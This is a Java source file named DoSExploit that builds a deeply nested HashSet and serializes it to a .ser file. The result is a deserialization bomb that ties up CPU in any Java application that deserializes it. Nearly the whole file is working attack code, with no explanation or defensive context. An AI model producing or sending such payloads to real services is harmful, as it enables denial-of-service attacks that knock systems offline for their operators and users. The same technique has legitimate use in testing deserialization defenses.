import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.util.*;

public class DoSExploit {
    public static void main(String[] args) {
        try {
            Set<Object> malicious_hashset = new HashSet<>();
            Set<Object> s1 = malicious_hashset;
            Set<Object> s2 = new HashSet<>();
            for (int i = 0; i < 100; i++) {
                Set<Object> t1 = new HashSet<>();
                Set<Object> t2 = new HashSet<>();
                t1.add("foo");
                s1.add(t1);
                s1.add(t2);
                s2.add(t1);
                s2.add(t2);
                s1 = t1;
                s2 = t2;
            }

            // serialize the malicious HashSet object
            String file_name = "dos_serialized_object.ser";
            FileOutputStream fout = new FileOutputStream(file_name);
            ObjectOutputStream oout = new ObjectOutputStream(fout);
            oout.writeObject(malicious_hashset);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
